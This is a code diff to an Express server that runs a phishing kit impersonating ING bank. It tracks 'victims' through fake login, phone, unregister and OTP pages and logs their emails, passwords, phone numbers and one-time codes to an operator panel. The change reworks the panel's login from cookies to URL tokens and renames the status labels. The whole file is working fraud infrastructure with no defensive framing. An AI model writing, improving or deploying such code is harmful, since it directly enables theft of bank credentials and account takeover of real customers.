@@ -6,7 +6,6 @@ const crypto  = require('crypto');
 /* ----------  CONFIG  ---------- */
 const PANEL_USER     = process.env.PANEL_USER  || 'admin';
 const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
-const COOKIE_SECRET  = process.env.COOKIE_SECRET || crypto.randomBytes(32).toString('hex');
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
@@ -22,32 +21,32 @@ let victimCounter     = 0;
 let successfulLogins  = 0;
 let currentDomain     = '';
 
-// Simple in-memory auth store (sid -> authed)
-const authSessions = new Map();
+// Token-based auth (token -> username)
+const authTokens = new Map();
 
 /* ----------  MIDDLEWARE  ---------- */
 app.set('trust proxy', 1);
-
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Simple cookie parser for auth
-app.use((req, res, next) => {
-  const cookie = req.headers.cookie || '';
-  req.authToken = cookie.split(';').find(c => c.trim().startsWith('auth='))?.split('=')[1] || null;
-  next();
-});
+/* ----------  AUTH HELPER  ---------- */
+function getAuthToken(req) {
+  // Check header first (for API calls), then query param (for page loads)
+  const header = req.headers['x-auth-token'];
+  const query = req.query.token;
+  return header || query || null;
+}
 
-/* ----------  AUTH MIDDLEWARE  ---------- */
 function checkAuth(req, res, next) {
-  const token = req.authToken;
-  if (token && authSessions.has(token)) {
+  const token = getAuthToken(req);
+  if (token && authTokens.has(token)) {
     req.isAuthed = true;
-    req.username = authSessions.get(token);
-    return next();
+    req.username = authTokens.get(token);
+    req.token = token;
+  } else {
+    req.isAuthed = false;
   }
-  req.isAuthed = false;
   next();
 }
 
@@ -62,34 +61,35 @@ app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html')
 
 /* ----------  PANEL ROUTES  ---------- */
 app.get('/panel', checkAuth, (req, res) => {
-  if (req.isAuthed) return res.sendFile(__dirname + '/_panel.html');
+  if (req.isAuthed) {
+    // Inject token into page for JS to use
+    let html = require('fs').readFileSync(__dirname + '/_panel.html', 'utf8');
+    html = html.replace('window.AUTH_TOKEN = null;', `window.AUTH_TOKEN = '${req.token}';`);
+    return res.send(html);
+  }
   res.sendFile(__dirname + '/access.html');
 });
 
 app.post('/panel/login', (req, res) => {
   const { user, pw } = req.body;
-  console.log('Login attempt:', user, 'Expected:', PANEL_USER, 'Match:', user === PANEL_USER && pw === PANEL_PASS);
+  console.log('Login attempt:', user, 'Match:', user === PANEL_USER && pw === PANEL_PASS);
   
   if (user === PANEL_USER && pw === PANEL_PASS) {
     const token = crypto.randomBytes(16).toString('hex');
-    authSessions.set(token, user);
-    
-    // Set cookie with minimal restrictions for Cloudflare compatibility
-    res.setHeader('Set-Cookie', `auth=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
-    console.log('Login success, token:', token);
-    return res.redirect('/panel');
+    authTokens.set(token, user);
+    console.log('Login success, redirecting with token:', token);
+    // Redirect with token in URL
+    return res.redirect('/panel?token=' + token);
   }
   
   res.redirect('/panel?fail=1');
 });
 
-app.post('/panel/logout', (req, res) => {
-  if (req.authToken) authSessions.delete(req.authToken);
-  res.setHeader('Set-Cookie', 'auth=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0');
+app.get('/panel/logout', (req, res) => {
+  const token = getAuthToken(req);
+  if (token) authTokens.delete(token);
   res.redirect('/panel');
 });
-
-app.get('/panel/*', (req, res) => res.redirect('/panel'));
 
 /* ----------  DOMAIN HELPER  ---------- */
 app.use((req, res, next) => {
@@ -109,19 +109,17 @@ function uaParser(ua) {
   if (/Chrome\/(\d+)/.test(ua)) u.browser.name = 'Chrome';
   if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
   if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
-  if (/Edge\/(\d+)/.test(ua)) u.browser.name = 'Edge';
   return u;
 }
 
 /* ----------  SESSION HELPERS  ---------- */
 function getSessionHeader(v) {
-  if (v.page === 'success') return `🦁 ING Login approved`;
-  if (v.status === 'approved') return `🦁 ING Login approved`;
-  if (v.page === 'index.html') return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
-  if (v.page === 'verify.html') return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
-  if (v.page === 'unregister.html') return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
-  if (v.page === 'otp.html') return v.otp ? `✅ Received OTP` : `🔑 Awaiting OTP...`;
-  return `🔑 Awaiting OTP...`;
+  if (v.page === 'success') return `APPROVED`;
+  if (v.page === 'index.html') return v.entered ? `CREDENTIALS` : 'WAITING';
+  if (v.page === 'verify.html') return v.phone ? `PHONE` : `WAITING`;
+  if (v.page === 'unregister.html') return v.unregisterClicked ? `UNREGISTERED` : `WAITING`;
+  if (v.page === 'otp.html') return v.otp ? `OTP` : `WAITING`;
+  return `WAITING`;
 }
 
 /* ----------  VICTIM API  ---------- */
@@ -167,7 +165,7 @@ app.post('/api/login', (req, res) => {
   v.email = email; 
   v.password = password;
   v.status = 'wait';
-  v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
+  v.activityLog.push({ time: Date.now(), action: 'CREDENTIALS', detail: email });
   
   auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, ip: v.ip, ua: v.ua });
   res.sendStatus(200);
@@ -181,7 +179,7 @@ app.post('/api/verify', (req, res) => {
   if (!v) return res.sendStatus(404);
   
   v.phone = phone;
-  v.activityLog.push({ time: Date.now(), action: 'ENTERED PHONE', detail: `Phone: ${phone}` });
+  v.activityLog.push({ time: Date.now(), action: 'PHONE', detail: phone });
   
   const entry = auditLog.find(e => e.sid === sid);
   if (entry) entry.phone = phone;
@@ -194,7 +192,7 @@ app.post('/api/unregister', (req, res) => {
   if (!v) return res.sendStatus(404);
   
   v.unregisterClicked = true;
-  v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Proceeded to unregister' });
+  v.activityLog.push({ time: Date.now(), action: 'UNREGISTER', detail: 'Clicked' });
   res.sendStatus(200);
 });
 
@@ -206,7 +204,7 @@ app.post('/api/otp', (req, res) => {
   if (!v) return res.sendStatus(404);
   
   v.otp = otp;
-  v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
+  v.activityLog.push({ time: Date.now(), action: 'OTP', detail: otp });
   
   const entry = auditLog.find(e => e.sid === sid);
   if (entry) entry.otp = otp;
@@ -218,9 +216,8 @@ app.post('/api/page', (req, res) => {
   const v = sessionsMap.get(sid);
   if (!v) return res.sendStatus(404);
   
-  const oldPage = v.page;
   v.page = page;
-  v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });
+  v.activityLog.push({ time: Date.now(), action: 'PAGE', detail: page });
   res.sendStatus(200);
 });
 
@@ -249,7 +246,8 @@ app.get('/api/panel', checkAuth, (req, res) => {
     waiting: list.filter(x => x.status === 'wait').length,
     success: successfulLogins,
     sessions: list,
-    logs: auditLog.slice(-50).reverse()
+    logs: auditLog.slice(-50).reverse(),
+    token: req.token // Return token so client can store it
   });
 });
 
